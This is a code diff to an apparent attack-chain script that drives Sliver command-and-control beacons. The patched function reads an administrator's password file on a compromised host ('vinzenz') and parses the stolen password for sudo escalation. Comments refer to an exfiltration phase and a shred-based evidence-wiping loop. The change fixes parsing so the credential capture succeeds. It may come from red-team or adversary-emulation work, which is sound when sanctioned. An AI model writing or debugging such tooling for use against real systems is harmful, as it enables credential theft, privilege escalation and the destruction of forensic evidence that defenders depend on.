@@ -32,10 +32,18 @@ dilutes the evidence they unavoidably contain rather than trying to remove it.
 """
 
 import base64
+import re
 import time
 
 from chainlog import log
 from advanced_initial_access import sliver_exec, sliver_upload
+
+# Sliver-client wraps each output line with ANSI escape codes (e.g. ``\x1b[2K``
+# to clear the line before printing). ``str.strip()`` doesn't remove them
+# because ESC (0x1b) isn't whitespace -- so a naive ``s.startswith("[")``
+# check would miss every framing line whose visible prefix starts with ``[``.
+# This regex matches CSI sequences (the common case sliver emits).
+_ANSI_RE = re.compile(r'\x1b\[[0-9;]*[A-Za-z]')
 
 
 # =============================================================================
@@ -176,17 +184,28 @@ def _phase0_read_password(vinzenz_beacon: str, vinzenz_password_file: str) -> st
     out = sliver_exec(vinzenz_beacon, cmd, timeout=15)
     if not out:
         raise RuntimeError(f"phase 0: empty sliver output reading {vinzenz_password_file}")
+
     # The password is the first non-sliver-framing, non-empty line of output.
+    # Sliver wraps every line with ANSI CSI sequences (e.g. ``\x1b[2K``); strip
+    # those FIRST so the prefix-match filter actually fires on framing lines.
+    # Without this, the very first match was ``\x1b[2K[*] Active session ...``
+    # (75 chars) which sudo silently rejected -- the chain worked anyway only
+    # because shred targets that didn't exist (this run had no exfil) read as
+    # "success" in the wipe loop.
     pw = ""
-    for line in out.splitlines():
-        s = line.strip()
-        if not s or s.startswith("[") or s.startswith("Connecting") \
-                or s.startswith("Active session") or s.startswith("Output:"):
+    for raw_line in out.splitlines():
+        s = _ANSI_RE.sub('', raw_line).strip()
+        if not s:
+            continue
+        if s.startswith(("[", "Connecting", "Active session", "Output:",
+                         "Execute:", "Session", "Beacon")):
             continue
         pw = s
         break
     if not pw:
-        raise RuntimeError(f"phase 0: could not parse password from {vinzenz_password_file}")
+        raise RuntimeError(
+            f"phase 0: could not parse password line from {vinzenz_password_file} output"
+        )
     log(f"[+] Phase 0: captured admin password ({len(pw)} chars) — used for sudo escalation, never logged")
     return pw
 
